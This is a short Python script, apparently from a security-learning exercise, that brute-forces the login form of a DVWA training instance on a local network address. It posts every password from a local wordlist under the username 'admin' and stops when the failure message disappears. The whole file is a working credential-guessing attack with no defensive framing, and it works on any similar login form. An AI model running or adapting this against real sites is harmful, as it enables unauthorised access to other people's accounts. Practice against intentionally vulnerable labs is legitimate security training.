import requests

target_url = "http://192.168.1.3/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/home/srikanth/Downloads/passwords.txt", "r") as wordlist:
    for words in wordlist:
        word = words.strip()
        data_dict["password"] = word
        my_response = requests.post(target_url, data=data_dict)
        if "Login failed" not in my_response.content.decode(errors="ignore"):
            print("[+]got password --> " + word)
            exit()
print("[-]password couldn't find")

